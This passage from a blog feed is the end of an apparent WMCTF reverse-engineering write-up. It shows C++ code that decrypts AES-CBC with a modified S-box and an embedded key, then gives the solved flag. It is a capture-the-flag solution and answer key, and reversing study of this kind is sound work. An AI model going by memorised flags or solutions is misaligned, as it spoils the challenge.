class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"aes.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> sbox[<span class="number">256</span>] = &#123;</span><br><span class="line">  <span class="comment">//0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F</span></span><br><span class="line">  <span class="number">0x7C</span>, <span class="number">0xF2</span>, <span class="number">0x63</span>, <span class="number">0x7B</span>, <span class="number">0x77</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0x0C</span>, <span class="number">0xCD</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0x08</span>, <span class="number">0xAE</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>, <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> rsbox[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> Rcon[<span class="number">11</span>] = &#123;</span><br><span class="line">  <span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> MixValue[<span class="number">4</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">02</span>, <span class="number">03</span>, <span class="number">01</span>, <span class="number">01</span>&#125;,</span><br><span class="line">                                      &#123;<span class="number">01</span>, <span class="number">02</span>, <span class="number">03</span>, <span class="number">01</span>&#125;,</span><br><span class="line">                                      &#123;<span class="number">01</span>, <span class="number">01</span>, <span class="number">02</span>, <span class="number">03</span>&#125;,</span><br><span class="line">                                      &#123;<span class="number">03</span>, <span class="number">01</span>, <span class="number">01</span>, <span class="number">02</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> InvMixValue[<span class="number">4</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">0xe</span>, <span class="number">0xb</span>, <span class="number">0xd</span>, <span class="number">0x9</span>&#125;,</span><br><span class="line">                                         &#123;<span class="number">0x9</span>, <span class="number">0xe</span>, <span class="number">0xb</span>, <span class="number">0xd</span>&#125;,</span><br><span class="line">                                         &#123;<span class="number">0xd</span>, <span class="number">0x9</span>, <span class="number">0xe</span>, <span class="number">0xb</span>&#125;,</span><br><span class="line">                                         &#123;<span class="number">0xb</span>, <span class="number">0xd</span>, <span class="number">0x9</span>, <span class="number">0xe</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">aes::aes(<span class="keyword">char</span> *key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;KeyExpansion(ctx.RoundKey, key);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    rsbox[sbox[i]] = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> aes::xor_iv(<span class="keyword">char</span> *data, <span class="keyword">char</span> *iv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        data[i] ^= iv[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> aes::KeyExpansion(<span class="keyword">unsigned</span> <span class="keyword">char</span> *RoundKey, <span class="keyword">char</span> *Key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> i, j, k;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tempa[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Nk; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        RoundKey[(i * <span class="number">4</span>) + <span class="number">0</span>] = Key[(i * <span class="number">4</span>) + <span class="number">0</span>];</span><br><span class="line">        RoundKey[(i * <span class="number">4</span>) + <span class="number">1</span>] = Key[(i * <span class="number">4</span>) + <span class="number">1</span>];</span><br><span class="line">        RoundKey[(i * <span class="number">4</span>) + <span class="number">2</span>] = Key[(i * <span class="number">4</span>) + <span class="number">2</span>];</span><br><span class="line">        RoundKey[(i * <span class="number">4</span>) + <span class="number">3</span>] = Key[(i * <span class="number">4</span>) + <span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = Nk; i &lt; Nb * (Nr + <span class="number">1</span>); ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        k = (i - <span class="number">1</span>) * <span class="number">4</span>;</span><br><span class="line">        tempa[<span class="number">0</span>]=RoundKey[k + <span class="number">0</span>];</span><br><span class="line">        tempa[<span class="number">1</span>]=RoundKey[k + <span class="number">1</span>];</span><br><span class="line">        tempa[<span class="number">2</span>]=RoundKey[k + <span class="number">2</span>];</span><br><span class="line">        tempa[<span class="number">3</span>]=RoundKey[k + <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i % Nk == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> u8tmp = tempa[<span class="number">0</span>];</span><br><span class="line">            tempa[<span class="number">0</span>] = tempa[<span class="number">1</span>];</span><br><span class="line">            tempa[<span class="number">1</span>] = tempa[<span class="number">2</span>];</span><br><span class="line">            tempa[<span class="number">2</span>] = tempa[<span class="number">3</span>];</span><br><span class="line">            tempa[<span class="number">3</span>] = u8tmp;</span><br><span class="line"></span><br><span class="line">            tempa[<span class="number">0</span>] = getSBoxValue(tempa[<span class="number">0</span>]);</span><br><span class="line">            tempa[<span class="number">1</span>] = getSBoxValue(tempa[<span class="number">1</span>]);</span><br><span class="line">            tempa[<span class="number">2</span>] = getSBoxValue(tempa[<span class="number">2</span>]);</span><br><span class="line">            tempa[<span class="number">3</span>] = getSBoxValue(tempa[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">            tempa[<span class="number">0</span>] = tempa[<span class="number">0</span>] ^ Rcon[i/Nk];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        j = i * <span class="number">4</span>; k=(i - Nk) * <span class="number">4</span>;</span><br><span class="line">        RoundKey[j + <span class="number">0</span>] = RoundKey[k + <span class="number">0</span>] ^ tempa[<span class="number">0</span>];</span><br><span class="line">        RoundKey[j + <span class="number">1</span>] = RoundKey[k + <span class="number">1</span>] ^ tempa[<span class="number">1</span>];</span><br><span class="line">        RoundKey[j + <span class="number">2</span>] = RoundKey[k + <span class="number">2</span>] ^ tempa[<span class="number">2</span>];</span><br><span class="line">        RoundKey[j + <span class="number">3</span>] = RoundKey[k + <span class="number">3</span>] ^ tempa[<span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> aes::AddRoundKey(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state)[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> *RoundKey)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span> ;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            state[i][j] ^=  RoundKey[j*<span class="number">4</span>+i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> aes::InvSubBytes(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state)[<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            state[i][j] = rsbox[state[i][j]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> aes::InvShiftRows(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state)[<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, cnt, tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(cnt++ &lt; i)</span><br><span class="line">        &#123;</span><br><span class="line">            tmp = state[i][<span class="number">3</span>];</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">3</span>; j &gt; <span class="number">0</span>; j--)</span><br><span class="line">            &#123;</span><br><span class="line">                state[i][j] = state[i][j<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            state[i][j] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> aes::gfmultby(<span class="keyword">unsigned</span> <span class="keyword">char</span> a, <span class="keyword">unsigned</span> <span class="keyword">char</span> b)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = a &gt;= <span class="number">0x80</span> ? (<span class="keyword">unsigned</span> <span class="keyword">char</span>)((a&lt;&lt;<span class="number">1</span>)^<span class="number">0x1b</span>):(<span class="keyword">unsigned</span> <span class="keyword">char</span>)(a &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(b == <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(b == <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> tmp^a;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(b == <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> gfmultby(tmp, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(b == <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> gfmultby(gfmultby(tmp, <span class="number">2</span>), <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(b == <span class="number">9</span>)</span><br><span class="line">        <span class="keyword">return</span> gfmultby(gfmultby(tmp, <span class="number">2</span>), <span class="number">2</span>)^a;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(b == <span class="number">10</span>)</span><br><span class="line">        <span class="keyword">return</span> gfmultby(gfmultby(tmp, <span class="number">2</span>), <span class="number">2</span>)^tmp;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(b == <span class="number">11</span>)</span><br><span class="line">        <span class="keyword">return</span> gfmultby(gfmultby(tmp, <span class="number">2</span>), <span class="number">2</span>)^tmp^a;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(b == <span class="number">12</span>)</span><br><span class="line">        <span class="keyword">return</span> gfmultby(gfmultby(tmp, <span class="number">2</span>), <span class="number">2</span>)^gfmultby(tmp, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(b == <span class="number">13</span>)</span><br><span class="line">        <span class="keyword">return</span> gfmultby(gfmultby(tmp, <span class="number">2</span>), <span class="number">2</span>)^gfmultby(tmp, <span class="number">2</span>)^a;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> gfmultby(gfmultby(tmp, <span class="number">2</span>), <span class="number">2</span>)^gfmultby(tmp, <span class="number">2</span>)^tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> aes::InvMixColumns(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state)[<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> output[<span class="number">4</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">0</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                output[i][j] ^= gfmultby(state[k][j], InvMixValue[i][k]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            state[i][j] = output[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> aes::getData(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*data)[<span class="number">4</span>], <span class="keyword">char</span> *plaint)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            data[j][i] = plaint[<span class="number">4</span>*i+j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> aes::decryption_cbc(<span class="keyword">char</span> *enc, <span class="keyword">char</span> *plain)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">10</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> state[<span class="number">4</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">0</span>&#125;&#125;, output[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    aes::getData(state, enc);</span><br><span class="line"></span><br><span class="line">    aes::AddRoundKey(state, ctx.RoundKey+i*<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span>(i--; ; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        aes::InvShiftRows(state);</span><br><span class="line">        aes::InvSubBytes(state);</span><br><span class="line">        aes::AddRoundKey(state, ctx.RoundKey+i*<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        aes::InvMixColumns(state);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            output[i][j] = state[j][i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        plain[i] = ((<span class="keyword">char</span> *)output)[i];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key[] = &#123;<span class="number">84</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">80</span>, <span class="number">105</span>, <span class="number">100</span>, <span class="number">58</span>, <span class="number">9</span>, <span class="number">48</span>, <span class="number">10</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">103</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> iv[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">0xA</span>, <span class="number">0xB</span>, <span class="number">0xC</span>, <span class="number">0xD</span>, <span class="number">0xE</span>, <span class="number">0xF</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> plain[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> enc[] = &#123;<span class="number">208</span>, <span class="number">96</span>, <span class="number">247</span>, <span class="number">198</span>, <span class="number">149</span>, <span class="number">66</span>, <span class="number">34</span>, <span class="number">253</span>, <span class="number">227</span>, <span class="number">107</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">161</span>, <span class="number">201</span>, <span class="number">216</span>, <span class="number">250</span>, <span class="number">207</span>, <span class="number">130</span>, <span class="number">200</span>, <span class="number">118</span>, <span class="number">248</span>, <span class="number">203</span>, <span class="number">124</span>, <span class="number">111</span>, <span class="number">248</span>, <span class="number">127</span>, <span class="number">153</span>, <span class="number">90</span>, <span class="number">18</span>, <span class="number">98</span>, <span class="number">198</span>, <span class="number">182</span>&#125;;</span><br><span class="line"></span><br><span class="line">aes *cry = <span class="keyword">new</span> aes(key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">cry-&gt;decryption_cbc(enc+i, plain+i);</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">0</span>)</span><br><span class="line">cry-&gt;xor_iv(plain+i, iv);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cry-&gt;xor_iv(plain+i, enc+(i<span class="number">-16</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(plain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后解密得到：<strong>wmctf{e78ce1a3ac4be37a96e27e98c}</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021蓝帽总决赛</title>
      <link href="/2021/08/26/2021%E8%93%9D%E5%B8%BD%E6%80%BB%E5%86%B3%E8%B5%9B/"/>
      <url>/2021/08/26/2021%E8%93%9D%E5%B8%BD%E6%80%BB%E5%86%B3%E8%B5%9B/</url>
      
